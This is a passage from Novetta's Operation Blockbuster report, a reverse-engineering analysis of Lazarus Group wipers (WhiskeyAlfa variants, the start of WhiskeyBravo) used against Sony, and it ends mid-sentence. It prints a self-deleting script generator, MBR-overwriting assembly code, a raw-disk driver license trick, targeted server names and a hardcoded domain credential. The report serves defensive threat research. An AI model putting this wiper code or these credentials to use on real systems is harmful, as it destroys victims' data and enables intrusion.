{
    "id": "63a59aee-a8e1-4426-b385-99a2a8603223",
    "created_at": "2022-10-25T16:48:19.468826Z",
    "updated_at": "2025-03-27T02:17:23.327165Z",
    "deleted_at": null,
    "sha1_hash": "5a5139532e0fdcc76ed9b216d03e33fc27949bc5",
    "title": "",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 2479025,
    "plain_text": "-----\n\nNovetta is an advanced analytics company that extracts value from the increasing volume,\nvariety and velocity of data. By mastering scale and speed, our advanced analytics software and\n\nsolutions deliver the actionable insights needed to help our customers detect threat and fraud,\n\nprotect high value networks, and improve the bottom line.\n\nFor innovative solutions for today’s most mission-critical, advanced analytics\n\nchallenges, contact Novetta:\n\nPhone: (571) 282-3000 | www.novetta.com\n\n**www.OperationBlockbuster.com**\n\n\n-----\n\n# Table of Contents\n\n###### 1. Operation Blockbuster.............................................4\n\n 2. [Wiper] WhiskeyAlfa.................................................7\n\n2.1 WhiskeyAlfa-One..........................................................................9\n\n2.2 WhiskeyAlfa-Two........................................................................10\n\n2.3 WhiskeyAlfa-Three....................................................................12\n\n###### 3. [Wiper] WhiskeyBravo............................................ 17\n\n3.2 WhiskeyBravo-Two..................................................................20\n\n###### 4. [Wiper] WhiskeyCharlie.........................................21\n\n 5. [Wiper] WhiskeyDelta........................................... 26\n\n5.1 WhiskeyDelta-One....................................................................30\n\n5.2 WhiskeyDelta-Two....................................................................31\n\n###### 6. [DDoS Bot] DeltaAlfa............................................. 36\n\n 7. [DDoS Bot] DeltaBravo..........................................40\n\n 8. [DDoS Bot] DeltaCharlie........................................41\n\n 9. Conclusions............................................................. 43\n\n\n-----\n\n### 1. Operation Blockbuster\n\nThis report details some of the technical findings of the Lazarus Group’s malware, observed\nby Novetta during Operation Blockbuster. We recommend reading the initial report[1] prior to\nthe reverse engineering reports for more details on the Operation and the Lazarus Group.\nThis reverse engineering report looks at the destructive malware found within the Lazarus\nGroup’s collection.\n\nOne of the more noticeable features of the Lazarus Group is the use of destructive malware. The Lazarus Group has two\nbasic classes of destructive malware. The first class, colloquially known as “wipers,” are a class of malware has the primary\nintent of destroying data on a victim’s machine. A variety of wiper tools have been found within the Lazarus Group’s\ncollection, each performing its task exceptionally well.\n\nThe second class of destructive malware within the Lazarus Group’s collection is distributed denial-of-service malware, or\nDDoS malware. DDoS malware floods a target’s network-connected service with an excessive number of request at once\nin order to overload the capacity of the server. This overloading results in legitimate traffic being ignored. It is analogous\nto have an entire city calling the same IT support center at the same time. Some people are going to get through while the\nmajority of people are simply going to get a busy signal as all the available phone lines fill up.\n\nThe naming scheme used by Novetta for the malware identified during Operation Blockbuster consists of at least two\nidentifiers which each identifier coming from the International Civil Aviation Organization (ICAO)’s phonetic alphabet,[2]\ncommonly referred to as the NATO phonetic alphabet. The first identifier specifies the general classification of the\nmalware family while the second identifier specifies the specific family within the larger general classification. For\nexample, DeltaAlfa specifies a DDoS bot family identified as Alfa.\n\n1 http://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\n\n[2 International Civil Aviation Organization. “Alphabet – Radiotelephony”. http://www.icao.int/Pages/AlphabetRadiotelephony.aspx Accessed 1 December 2015.](http://www.icao.int/Pages/AlphabetRadiotelephony.aspx)\n\n\n-----\n\n|FIRST LEVEL IDENTIFIER|GENERAL CLASSIFICATION|\n|---|---|\n|Delta|DDoS|\n|Hotel|HTTP Server|\n|India|Installer|\n|Lima|Loader|\n|Kilo|Keylogger|\n|Papa|Proxy|\n|Romeo|RAT|\n|Sierra|Spreader|\n|Tango|Tool (Non-classed)|\n|Uniform|Uninstaller|\n|Whiskey|Destructive Malware (“Wiper”)|\n\n\n**FIRST LEVEL IDENTIFIER** **GENERAL CLASSIFICATION**\n\nDelta DDoS\n\nHotel HTTP Server\n\nIndia Installer\n\nLima Loader\n\nKilo Keylogger\n\nPapa Proxy\n\nRomeo RAT\n\nSierra Spreader\n\nTango Tool (Non-classed)\n\nUniform Uninstaller\n\nWhiskey Destructive Malware (“Wiper”)\n\n**Table 1‑1: First Level Identifiers for the Lazarus Group Family Names and their Classification Meanings**\n\nThere is no temporal component to the second level identifiers given to malware families. While generally the second\nidentifiers are largely sequential (Alfa, Bravo, Charlie, and so on), the identifier does not indicate that one family came\nbefore another chronologically. Instead, the second level identifiers were assigned by the order Novetta discovered each\nparticular family.\n\n\n-----\n\n|Col1|eyAlfa eyBravo eyCharlie eyDelta|\n|---|---|\n|Whisk Whisk Whisk Whisk||\n\n\n## The Lazarus Group\n\n**WHISKEY** **UNIFORMUNIFORM** **TANGOTANGO** **SIERRASIERRA** **ROMEOROMEO** **PAPAPAPA** **LIMALIMA** **KILOKILO** **INDIA** **HOTEL** **DELTA**\n\nDestructive Uninstaller Tool Spreader RAT Proxy Loader Keylogger Installer HTTP Server DDoS\nMalware (Non-\n(”Wiper”) classed)\n\n**WhiskeyAlfa** **DeltaAlfa**\n\n**WhiskeyBravo** **DeltaBravo**\n\n**DeltaCharlie**\n\n**WhiskeyCharlie**\n\n**WhiskeyDelta**\n\n**UniformAlfa** **IndiaAlpha** **HotelAlfa**\n\n**UniformJuliett** **IndiaBravo**\n\n**TangoAlfa** **RomeoAlfa** **IndiaCharlie**\n\n**TangoBravo** **RomeoBravo** **IndiaDelta**\n\n**TangoCharlie** **RomeoCharlie** **IndiaEcho**\n\n**TangoDelta** **RomeoDelta** **IndiaFoxtrot**\n\n**RomeoEcho** **IndiaGolf**\n\n**RomeoFoxtrot** **IndiaHotel**\n\n**RomeoGolf** **IndiaIndia**\n\n**RomeoHotel** **IndiaJuliett**\n\n**SierraAlfa** **RomeoMike** **IndiaKilo**\n\n**SierraBravo** **RomeoNovember** **IndiaWhiskey**\n\n**SierraCharlie** **RomeoWhiskey**\n\n**SierraJuliett-MikeOne**\n\n**SierraJuliett-MikeTwo**\n\n**KiloAlfa**\n\n**LimaAlfa**\n\n**LimaBravo**\n\n**LimaCharlie**\n\n**PapaAlfa** **LimaDelta**\n\n\n-----\n\n### 2. [Wiper] WhiskeyAlfa\n\nOne of the most visible pieces of the Sony Pictures Entertainment (SPE) attack, WhiskeyAlfa is a family of destructive\nmalware designed to destroy the contents of any hard drives attached to a computer infected with the malware. There are\nthree known variants of WhiskeyAlfa: WhiskeyAlfa-One, WhiskeyAlfa-Two, and WhiskeyAlfa-Three. WhiskeyAlfa-One is a\nsimplified variant that focuses purely on the destruction of a victim’s data. WhiskeyAlfa-Two, the variant associated with the\nSPE attack, performs this same destruction but also drops an additional malware family, HotelAlfa.[3] WhiskeyAlfa-Three is a\nmodified version of WhiskeyAlfa-Two that also includes a spreading mechanism specific to the SPE infrastructure.\n\nThe WhiskeyAlfa malware variants contain two primary attacks for destroying a victim’s data:\n\n           - Attack type 1, a.k.a. FileOverwrite, overwrites all files with random data from the heap (up to 4,194,304 bytes)\n\n           - Attack type 2, a.k.a. SectorOverwrite, uses a raw disk access driver to overwrite sectors of the victim’s hard drives with\n\nrandom data\n\nThe FileOverwrite attack begins by recursively identifying all files on the victim’s machines for each drive assigned a letter (e.g.\n```\n        C:, D:, and so on). Due to the fact that identifying each file on a set of drives can be a time consuming process, the\n\n```\n_FileOverwrite attack is performed within its own thread making it asynchronous to any other attack types that may also be in_\nplay on a victim’s machine infected with WhiskeyAlfa. For each file that matches a variant-specific condition or set of condi­\ntions, which will be explained in the variants’ subsections that follow, WhiskeyAlfa will apply a quasi-secure deletion function.\n\nThe WhiskeyAlfa deletion technique for files is not the same used in other Lazarus Group variants but rather a crude\noverwrite technique. The quasi-secure deletion function will overwrite a specified file by allocating a buffer from heap\nmemory equal to the size of the file up to a maximum of 4,194,304 bytes, followed by writing the contents of the buffer to\nthe file using WriteFile. The end result of this type of overwrite is the simple replacement of data for a given filename\nusing artifacts from memory.\n\nThe SectorOverwrite attack relies on the EldoS RawDisk[4] driver in order to access the hard drive directly (thus largely\nskipping the Windows hardware abstraction layer and avoiding operating system safeguards). In order to activate the\nEldos RawDisk driver, WhiskeyAlfa must first drop the driver to the victim’s hard drive and then activate the driver by\ninstalling it as a service that WhiskeyAlfa must start. Since the RawDisk driver is architecture-specific, WhiskeyAlfa\ncontains both a 32-bit and 64-bit version of the binary within its resource section under ICON_PACKAGES\\129 (32-bit)\nand ICON_PACKAGES\\131 (64-bit). The RawDisk driver is encrypted using an encryption scheme Novetta was unable to\nidentify. WhiskeyAlfa will drop the appropriate RawDisk driver to %TEMP%\\usbdrv3.sys after decrypting the driver.\n\nIn order to activate the driver, WhiskeyAlfa must first install the driver as a service. WhiskeyAlfa uses the Windows services\nAPI function CreateService to add a new service named usbdrv3 to the Windows services database. The new service is\ngiven the display name of “USB 3.0 Host Controller” and the %TEMP%\\usbdrv3.sys file is specified as the service execut­\nable. If a service with the name usbdrv3 already exists on the victim’s machine, it is stopped prior to the installation of\nWhiskeyAlfa’s usbdrv3 in order to prevent the RawDisk driver from improperly activating due to a service name collision.\n\nEldoS’s RawDisk driver has been used by other destructive malware families, most notably Shamoon in mid-2012,[5] prior\n\n3 http://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Tools-Report.pdf\n\n[4 EldoS. “Direct access to disks and protected files from user-mode applications in Windows - RawDisk™” https://www.eldos.com/rawdisk/index.php. Accessed 25 November 2015.](https://www.eldos.com/rawdisk/index.php)\n\n[5 Dmitry Tarakanov. SecureList. “ Shamoon The Wiper: Further Details (Part II)” https://securelist.com/blog/incidents/57784/shamoon-the-wiper-further-details-part-ii/ 11 September 2012.](https://securelist.com/blog/incidents/57784/shamoon-the-wiper-further-details-part-ii/)\n\n\n-----\n\nto its inclusion in samples of WhiskeyAlfa, a malware family with a short known life span that includes only the month of\nNovember 2014. Unlike Shamoon, which used the RawDisk library for accessing the drive, WhiskeyAlfa directly interfaces\nwith the driver and thus cuts out the use of the RawDisk library. While this is a seemingly minor optimization, it points to\na level of familiarity with the RawDisk system that clearly the author(s) of Shamoon did not have or choose to use.\n\nWhenever a program needs to access the RawDisk driver, the program must open a file handle through a specifically\nformatted filename. Depending on if the program needs to access the RawDisk driver for the physical drive\n(e.g. \\\\.\\PhysicalDrive0) or for the logical drive (e.g. C:\\), the filename that the program requests through CreateFile\nmust contain a hash character (#) followed by the license key issued to the developer by EldoS. For example, when Whis­\nkeyAlfa opens an interface to the RawDisk driver for the physical drive on a victim’s computer, the malware will open the\nfollowing filename:\n```\n         \\\\?\\ElRawDisk\\??\\\\PhysicalDrive0#99E2428CCA4309C68AAF8C616EF3306582A64513E55C786A8\n\n         64BC83DAFE0C78585B692047273B0E55275102C664C5217E76B8E67F35FCE385E4328EE1AD139EA6AA\n\n         26345C4F93000DBBC7EF1579D4F\n\n```\nOr, if WhiskeyAlfa needs to access the C: drive, then the following filename is opened:\n```\n         \\\\?\\ElRawDisk\\??\\\\C:#99E2428CCA4309C68AAF8C616EF3306582A64513E55C786A864BC83DAFE0C7\n\n         8585B692047273B0E55275102C664C5217E76B8E67F35FCE385E4328EE1AD139EA6AA26345C4F93000D\n\n         BBC7EF1579D4F\n\n```\nIn either mode, the important component is the license key, as RawDisk will fail to open an interface to itself if the license\nkey is invalid. The developer(s) of Shamoon used an easily obtainable temporary license key that has a built in expira­\ntion date and is registered to binnatova@bsunanotechnology.com. This is the reason that Shamoon required the\ncurrent time of the victim’s system to exist within a very specific window. WhiskeyAlfa, however, got around the expi­\nration date issue by using a legitimate license key from another product: the file utilities from Briggs Softworks.[6] The\nlicense key found in WhiskeyAlfa has an expiration date of 22 September 3378 16:43:04 and the license name of “Briggs\n```\n       Softworks (single-dev vendor).” The fact that the developer(s) of WhiskeyAlfa used a stolen license key parallels\n\n```\nthe Lazarus Group’s use of compromised infrastructure, as it provides a necessary resource to the group without directly\nrelatable evidence pointing back to the parties involved.\n\nWith the RawDisk driver installed, the SectorOverwrite attack begins by generating three buffers: a buffer consisting of\n65,536 0xAA bytes, a buffer of 65536 0x55 bytes, and a buffer of 65,536 random bytes. These buffers become the basis for\nthe data written to sectors on a victim’s hard drives. The first phase of the SectorOverwrite attack consists of using the\nRawDisk driver to access the physical disks 0 through 29 and overwriting the first 64 MB of the drives with the contents\nof the three buffers (in order of 0xAA, 0x55, and random). The next phase of the attack uses the RawDisk driver to access\nthe logical drives starting at drive Z: and working backwards through to drive C:, with each drive having specific areas\noverwritten using the three buffers. The next phase of the SectorOverwite attack is particularly aggressive as 300 threads\nare generated for the potential of physical drives 0 through 299 being attacked by having every byte of every sector of the\ndrives replaced with random data. The last phase of the SectorOverwrite attack consists of attempting to call\n```\n       GetDiskFreeSpaceEx against each of the possible lettered drives Z: through C:. For any drive that returns a\n\n```\nsuccessful result, the SectorOverwrite attack assumes the drive was not successfully damaged and will attempt to overwrite\na significant number of sectors with data from the random buffer generated at the beginning of the attack. The attack\nconcludes with a call to Sleep with the value set to INFINITE. If Sleep does return eventually, then the usbdrv3 service\nis removed and the RawDisk driver file is removed via a secure deletion function.\n\n[6 Briggs Softworks. “Briggs Softworks: home for encryption, calendar, graphics, poker, and file utilities for Windows” https://www.briggsoft.com/. Accessed 27 November 2015.](https://www.briggsoft.com/)\n\n\n-----\n\n#### 2.1 WhiskeyAlfa-One\n\nBy far the most simplified version of WhiskeyAlfa, WhiskeyAlfa-One has a singular focus: destruction of data. Wrapped\nin a simple Windows GUI framework, WhiskeyAlfa-One begins by deleting the Windows event logs System, Security,\n```\n       Application, and Setup by either calling the API function EvtClearLog from wevtapi.dll or by issuing the\n\n```\ncommand wevtutil.exe cl via a CreateProcess call.\n\nWhiskeyAlfa-One proceeds to use the FileOverwrite attack followed immediately by the SectorOverwrite attack. Once the\nattacks complete, assuming that the Sleep function ultimately returns and the driver is removed, a suicide script is then\ngenerated and executed. The suicide script generation function uses string concatenation functions and ShellExecute\nto execute the script, as seen in the code in Figure 2-1:\n```\n            strcpy(buffer, \"@echo off\\r\\n\");\n            strcpy(buffer, \":Loop\\r\\ndel \\\"\");\n            strcat(buffer, szWhiskeyAlfaOneFilename);\n            strcat(buffer, \"\\\"\\r\\nif exist \\\"\");\n            strcat(buffer, szWhiskeyAlfaOneFilename);\n            strcat(buffer, \"\\\" goto Loop\\r\\ndel \\\"\");\n            strcat(buffer, szSuicideScriptFilename);\n            strcat(buffer, \"\\\"\");\n            WriteFile(hFile, buffer, strlen(buffer), &NumberOfBytesWritten, 0);\n            CloseHandle(hFile);\n            ShellExecuteA(0, \"open\", szSuicideScriptFilename, 0, 0, 0);\n\n```\n**Figure 2‑1: Code Snippet of WhiskeyAlfa-One's Suicide Ssript Generation Function**\n\nThe suicide script’s generation and format is nearly identical to that of IndiaAlfa-One, with the exception that the first\n```\n       del command is missing the /a H parameter. It is worth noting that WhiskeyAlfa-One has the same superfluous\n       strcpy(buffer, \"@echo off\\r\\n\") instruction found in IndiaAlfa-One. A race condition begins once the suicide\n\n```\nscript executes, as the very next function that WhiskeyAlfa-One calls shuts down the Windows operating system by\ncalling the ExitWindowsEx function. Depending on how quickly the operating system shuts down, it is possible that the\nsuicide script will not have a chance to complete its task; however, the devastation that WhiskeyAlfa-One has inflicted on\nthe victim’s hard drives makes the need for a suicide script somewhat unnecessary.\n\n\n-----\n\n|FLAG|OPERATING MODE|MEANING|\n|---|---|---|\n|-d|Service|Perform the FileOverwrite attack on non-executable (.exe and .dll) files|\n|-i|Stand-alone|Install WhiskeyAlfa on the victim’s machine as a service|\n|-k|Service or Stand-alone|Perform FileOverwrite and SectorOverwrite attacks, install HotelAlfa, report status to C2 server and shutdown the Microsoft Exchange Information Store service (MSExchangeIS) before shutting down the victim’s machine after two hours.|\n|-m|Service|Perform the SectorOverwrite attack|\n|-w|Service|Install and activate HotelAlfa|\n\n\n#### 2.2 WhiskeyAlfa-Two\n\nWhiskeyAlfa-Two is more feature rich than its sibling, WhiskeyAlfa-One, but ultimately it serves the same purpose:\nthe wholesale destruction of data. WhiskeyAlfa-Two takes a set of optional flags to determine its particular mode of\noperation. Table 2-1 below identifies the various flags that WhiskeyAlfa supports. If the malware is executed without any\nflags, WhiskeyAlfa-Two will merely execute itself again with the –i flag as its argument, causing the malware to install\nitself as a service on the victim’s computer. Effectively, WhiskeyAlfa-Two has the capability to self-install.\n\n**FLAG** **OPERATING MODE** **MEANING**\n\n`-d` Service Perform the FileOverwrite attack on non-executable (.exe and .dll) files\n\n`-i` Stand-alone Install WhiskeyAlfa on the victim’s machine as a service\n\n`-k` Service or Stand-alone Perform FileOverwrite and SectorOverwrite attacks, install HotelAlfa, report status\nto C2 server and shutdown the Microsoft Exchange Information Store service\n(MSExchangeIS) before shutting down the victim’s machine after two hours.\n\n`-m` Service Perform the SectorOverwrite attack\n\n`-w` Service Install and activate HotelAlfa\n\n**Table 2-1: WhiskeyAlfa-Two’s Supported Command Line Flags**\n\nThe installation process is straightforward:\n\n1. Call CreateService to create a new Windows service named brmgmtsvc with the display name of “Backup\n```\n         and Restore Management Service”\n\n```\n2. Set the description of the service to “Backup and Restore Management Service” and establish the error\n\nrecovery conditions by calling ChangeServiceConfig2\n\n3. Activate the service by calling StartService\n\nWhen running as a service, WhiskeyAlfa-Two can perform a variety of attacks. The FileOverwrite attack (argument –d)\nwill attack all non-executable files (files that do not have an .exe or .dll extension) on a victim’s letter-assigned drives.\nSome variants of WhiskeyAlfa-Two will avoid removing files from the %PROGRAMFILES% directory as well as %WINDIR%.\n\nWhiskeyAlfa-Two can also drop HotelAlfa when executed with the –w argument. The process of installing HotelAlfa\nbegins by WhiskeyAlfa-Two stopping the Windows Terminal Services service (termservice). The HotelAlfa binary\nis then decrypted and extracted from the WhiskeyAlfa-Two resource ICON_PACKAGES\\133 and saved on the victim’s\nmachine as %WINDIR%\\iissvr.exe. HotelAlfa is activated by calling CreateProcess with the filename and path of\nthe iissvr.exe binary.\n\nActivating the various attack types and install the HotelAlfa malware as individual steps can be cumbersome and this\ncould be the reason that the developer(s) of WhiskeyAlfa-Two supplied the –k command. When called with the –k\nargument, WhiskeyAlfa-Two will delay 10 minutes after being activated before executing itself with the –w argument\nsupplied to start the installation of HotelAlfa. After 3 seconds, WhiskeyAlfa-Two spawns a new instance of itself with\nthe –m argument supplied to induce the SectorOverwrite mode. An additional 3 seconds later, WhiskeyAlfa-Two generates\nanother copy of itself with the –d argument supplied to start the FileOverwrite attack. WhiskeyAlfa-Two will report victim\ninformation back to one of three hardcoded C2 server. The data that WhiskeyAlfa-Two sends to the C2 server consist of a\n40-byte data structure defined in Table 2-2.\n\n\n-----\n\n```\n         [DWORD]: Local IP Address of victim\n         [32 bytes]: Computer name\n         [DWORD]: Flag (set to 4)\n\n```\n**Table 2-2: WhiskeyAlfa-Two’s Status Structure**\n\nThe data to the C2 server is sent without encryption, and the C2 server does not respond with any additional packets.\nThis would indicate that the data burst to the C2 is merely a status update transmission that allows the Lazarus Group to\ndetermine which machines have suffered from a WhiskeyAlfa-Two attack.\n\nOnce the status report has been transmitted to a C2 server, WhiskeyAlfa-Two stops the MSExchangeIS service. The\n```\n       MSExchangeIS service is the Microsoft Exchange Information Store service that is responsible for housing the contents\n\n```\nof an Exchange email server (i.e. emails, contacts, etc). Two hours after stopping the Exchange server, WhiskeyAlfa-Two\nwill shut down the victim’s machine by calling the ExitWindowsEx function.\n\n\n-----\n\n|FLAG|OPERATING MODE|MEANING|\n|---|---|---|\n|-a|Service|Disable AVs using TangoDelta.|\n|-n|Service|FileOverwrite attack against any file so long as the drive is DRIVE_FIXED, DRIVE_REMOVABLE, DRIVE_RAMDISK, or DRIVE_REMOTE (this is an expansion of targets from the -d command that only allows for DRIVE_FIXED and DRIVE_REMOVABLE.)|\n|-s|Service|Attempt to login to predefined SPE servers and delete all files on all shares.|\n\n\n#### 2.3 WhiskeyAlfa-Three\n\nWhiskeyAlfa-Three is an enhanced version of WhiskeyAlfa-Two. The primary differences between WhiskeyAlfa-Three\nand WhiskeyAlfa-Two is the inclusion of a Windows share file deletion option, an option to drop and run TangoDelta, as\nwell as the expansion of which files the FileOverwrite attack will target. WhiskeyAlfa-Three also adds three new command\nline arguments, as seen in Table 2-3, while removing the –w argument.\n\n**FLAG** **OPERATING MODE** **MEANING**\n\n-a Service Disable AVs using TangoDelta.\n\n-n Service _FileOverwrite attack against any file so long as the drive is DRIVE_FIXED,_\n```\n                          DRIVE_REMOVABLE, DRIVE_RAMDISK, or DRIVE_REMOTE\n\n```\n(this is an expansion of targets from the -d command that only allows for\n```\n                          DRIVE_FIXED and DRIVE_REMOVABLE.)\n\n```\n-s Service Attempt to login to predefined SPE servers and delete all files on all shares.\n\n**Table 2-3: WhiskeyAlfa-Three’s Additional Supported Command Line Flags**\n\nWhen the –a argument is supplied to WhiskeyAlfa-Three, it begins the process of extracting and decoding two files from\nits resource section but only if the host operating system is 64-bit. Resource ICON_PACKAGES\\137 contains the Process\nHacker driver, which WhiskeyAlfa-Three will save as %TEMP%\\khp.sys, and resource ICON_PACKAGES\\136 contains\nthe TangoDelta binary that ultimately gets saved to %TEMP%\\ams.exe. With the TangoDelta components dropped to the\nvictim’s hard drive, WhiskeyAlfa-Three uses CreateProcess to activate the TangoDelta malware.\n\nWhile WhiskeyAlfa-Three contains the same FileOverwrite attack found within WhiskeyAlfa-Two variants,\nWhiskeyAlfa-Three contains an additional mode (argument –n) that will expand the allowable targets from only fixed\n(hard drives) and removable (such as USB drives and floppy disks) drives to include RAM disk and remote drives.\nWhiskeyAlfa-Three enforces the condition that it will avoid removing files from the %PROGRAMFILES% and %WINDIR%\ndirectories. Additionally, the –n argument will change the wallpaper of the user account under which WhiskeyAlfa-Three\nis executing to the image seen in Figure 2-1. As will be discussed later, WhiskeyAlfa-Three uses the –n argument mode\nwhen attacking user accounts logged onto a WhiskeyAlfa-Three infected machine, which makes the inclusion of the\nwallpaper replacement somewhat less baffling.\n\n\n-----\n\n**Figure 2-1: Wallpaper of Users Infected with WhiskeyAlfa-Three**\n\nThe SectorOverwrite attack within WhiskeyAlfa-Three operates in roughly the same manner as the other WhiskeyAlfa\nvariants with the exception of a very specific modification made to the Master Boot Record (MBR) of targeted drives.\nWhiskeyAlfa-Three replaces the MBR (sector 0) of each physical drive with the code fragment shown in Figure 2-2.\n\n\n-----\n\n```\n          MBR:7C00 start:\n          MBR:7C00         xor   ax, ax\n          MBR:7C02         mov   ss, ax\n          MBR:7C04         mov   sp, offset start\n          MBR:7C07         sti\n          MBR:7C08         push  ax\n          MBR:7C09         pop   es\n          MBR:7C0A         push  ax\n          MBR:7C0B         pop   ds\n          MBR:7C0C         cld\n          MBR:7C0D         mov   si, offset dap1 ; SI = PTR to DAP\n          MBR:7C10         xor   cx, cx\n          MBR:7C12\n          MBR:7C12 loop:\n          MBR:7C12         inc   cx\n          MBR:7C13         cmp   cx, 100h\n          MBR:7C17         jz   short duplicateMBR\n          MBR:7C19\n          MBR:7C19 overwriteSectors:\n          MBR:7C19         mov   ah, 43h     ; Func: EXTENDED WRITE\n          MBR:7C1B         mov   al, 0      ; Verify Flag = No Verify\n          MBR:7C1D         int   13h       ; BIOS DISK function\n          MBR:7C1F         inc   dl       ; Physical drive number\n          MBR:7C21         cmp   dl, 84h     ; last physical drive?\n          MBR:7C24         jl   short overwriteSectors\n\n```\n**MBR:7C26         mov   dl, 80h     ; use first physical drive**\n```\n          MBR:7C28         mov   di, offset dap1.qwStartSectorToWrite\n          MBR:7C2B         add   word ptr [di], 400h\n          MBR:7C2F         adc   word ptr [di+2], 0\n          MBR:7C33         adc   word ptr [di+4], 0\n          MBR:7C37         adc   word ptr [di+6], 0\n          MBR:7C3B         jmp   short loop\n          MBR:7C3D ; -----------------------------------------------------------------\n          MBR:7C3D\n          MBR:7C3D duplicateMBR:\n          MBR:7C3D         mov   si, offset dapMBR ; PTR to DAP\n          MBR:7C40         mov   ah, 43h     ; Func: EXTENDED WRITE MBR:7C42        \n          MBR:7C42         mov   al, 0      ; Verify Flag = No Verify\n          MBR:7C44         int   13h       ; BIOS DISK function\n          MBR:7C46         xor   cx, cx\n          MBR:7C48         mov   si, offset dap1\n          MBR:7C4B         jmp   short loop\n          MBR:7C4B ; -----------------------------------------------------------------\n          MBR:7C4D dapMBR     db 16          ; size\n          MBR:7C4D         db 0          ; zero _ unused\n          MBR:7C4D         dw 1          ; sectorsToWrite\n          MBR:7C4D         dd 7C00h        ; ptrDataToWrite\n          MBR:7C4D         dq 0          ; qwStartSectorToWrite\n          MBR:7C5D dap1      db 16          ; size\n          MBR:7C5D         db 0          ; zero _ unused\n          MBR:7C5D         dw 64          ; sectorsToWrite\n          MBR:7C5D         dd 0          ; ptrDataToWrite\n          MBR:7C5D         dq 0          ; qwStartSectorToWrite\n\n```\n**Figure 2-2: WhiskeyAlfa-Three’s MBR Trojan Code**\n\n\n-----\n\nThe WhiskeyAlfa-Three MBR Trojan performs the following tasks:\n\n1. Overwrite 64 sectors starting at sector 1024 with random data 256 times (the random data to use is located at\n```\n         0000:0000 through 0000:7FFF in 16-bit mode)\n\n```\n2. Copy the current MBR to each attached physical drive.\n\nIt would appear that the MBR modification of WhiskeyAlfa-Three acts as a form of failsafe in the event that a drive’s\ndestruction was not completed by the time the victim’s computer shut down. The use of the MBR to further the destruc­\ntion of a victim’s hard drive data is a testament to the motivation of the WhiskeyAlfa developer(s) to ensure complete\ndevastation of the victim’s data.\n\nWhiskeyAlfa-Three is most definitely a targeted piece of malware, as it includes a mode (via the –s argument) that will\nattempt to connect to a series of servers that most likely belonged to SPE infrastructure and delete all of the files available\nvia shares on the servers. The attack, ShareShredder, begins by attempting to connect to each of the hardcoded servers by\nname, as identified in Figure 2-3.\n```\n          \\\\la_data\n          \\\\la_apps\n          \\\\la_users\n          \\\\172.20.10.117\n          \\\\SPE-BU1\n          \\\\SPE-CP2\n          \\\\SPE-CP3\n          \\\\SPE-CPDEV1\n          \\\\SPE-CS1\n          \\\\SPE-CS2\n          \\\\SPE-da1\n          \\\\SPE-FTO\n          \\\\SPE-HYDN1\n          \\\\SPE-KE1\n          \\\\SPE-KE3\n          \\\\SPE-KE4\n          \\\\MHTN1\n          \\\\SPE-sf1\n          \\\\SPE-SP1\n          \\\\SPE-SP2\n          \\\\SPE-SP3\n          \\\\SPE-SP5\n          \\\\SPE-SPA1\n          \\\\SPE-SPECP1\n          \\\\SPE-to1\n          \\\\SPE-TO2\n          \\\\USCHIPLH01\n          \\\\USPHXRNH01\n          \\\\USPLH12\n          \\\\USPLV05\n\n```\n**Figure 2-3: Targeted Infrastructure Found Within WhiskeyAlfa-Three**\n\nTo connect to the servers, WhiskeyAlfa-Three issues the following command via CreateProcess:\n```\n       cmd.exe /c net use SERVERNAME “P@ssw0rd123” /u:”SPE\\ADutta2-1” > RANDOM_PID\n\n```\nThe SERVERNAME value is the name of the server to which a connection is being requested, RANDOM is the current\nvalue from GetTickCount, and PID is the current PID of the WhiskeyAlfa-Three process. The log file that the command\nproduces (the RANDOM_PID file) is scanned to determine if “successfully” is present, indicating that the connection\nto the server was successful using the supplied credentials; the file is then deleted.\n\n\n-----\n\nIf a connection to the targeted server was successful, a call to NetShareEnum is made to determine the available shares\non the server. From the list of shares available, WhiskeyAlfa-Three will randomly select one share as its target for data\ndestruction. It is interesting that the developer(s) chose to limit the destruction of data to a single share per host infected\nby WhiskeyAlfa-Three. The data destruction process consists of recursively identifying each file and directory within a\nshare for the Windows API function DeleteFile to remove the file.\n\nWhiskeyAlfa-Three modifies the behavior of the –k mode slightly from that seen in WhiskeyAlfa-Two. Upon activation,\nWhiskeyAlfa-Three will call Sleep for a suspension of 2 hours before issuing the various other modes. After the sleep\ndelay, WhiskeyAlfa-Three will execute itself with –a to drop TangoDelta. A five second delay later, WhiskeyAlfa-Three will\nspawn new instances of itself with the –m argument, then the –d argument, and finally the –s argument. After issuing\nthe various attack modes, WhiskeyAlfa-Three will enumerate all logged-on users and attempt to run itself with the –n\nargument as each logged-on user. WhiskeyAlfa-Three then reports victim information back to one of three hardcoded\nC2 server using the same method as WhiskeyAlfa-Two. But unlike WhiskeyAlfa-Two, after the data burst to the C2 server,\nWhiskeyAlfa-Three does not shut down any additional services or the victim’s system. The fact that WhiskeyAlfa-Three\nattempts to run itself as loggedon users and does not shut down the victim’s computer may indicate that the malware was\ndesigned to target a terminal services-enabled server that would be immediately noticeable if rendered inoperative, but at\nthe same time the malware announces itself by replacing infected users’ desktop wallpaper.\n\n\n-----\n\n|OFFSET|SIZE|DEFAULT VALUE (AS SET BY INDIAGOLF)|DESCRIPTION|\n|---|---|---|---|\n|0|8-bytes (Double)|Current system time at time of WhiskeyBravo installation in VARIANTTIME format.|WhiskeyBravo’s installation time.|\n|8|4|7|Activation delay (in days)|\n\n\n### 3. [Wiper] WhiskeyBravo\n\nDestructive malware doesn’t need to be overly complicated, as WhiskeyBravo proves. Observed being installed as a service\nby IndiaGolf, notably during the “Ten Days of Rain” incident as reported by McAfee,[7] WhiskeyBravo has only two tasks:\ndestroy then delete all files on the victim’s machine and overwrite all sectors on the victim’s hard drive (or only the MBR if\nthe victim is using the Windows Vista or newer operating system).\n\nThere are two observed variants of WhiskeyBravo: WhiskeyBravo-One and WhiskeyBravo-Two. From a code perspective,\nWhiskeyBravo-One and WhiskeyBravo-Two are extremely similar, with the latter being simpler despite being chronolog­\nically newer. The primary difference between the two is that WhiskeyBravo-Two simplifies the file overwrite and deletion\ntask somewhat. Given their high similarity, it is easiest to look at the generic functionality before delving into the subtle\ndifferences of the variants.\n\nBefore WhiskeyBravo can begin its destructive tasks, it must first determine if the victim’s machine is within a target\ntime range. Dropped as part of the installation process by IndiaGolf, the file %SYSDIR%\\noise03.dat contains a 12-byte\ndata structure the defines the operating period for WhiskeyBravo and will be referred to in this section as the “operation\nconfiguration” file. The format for the 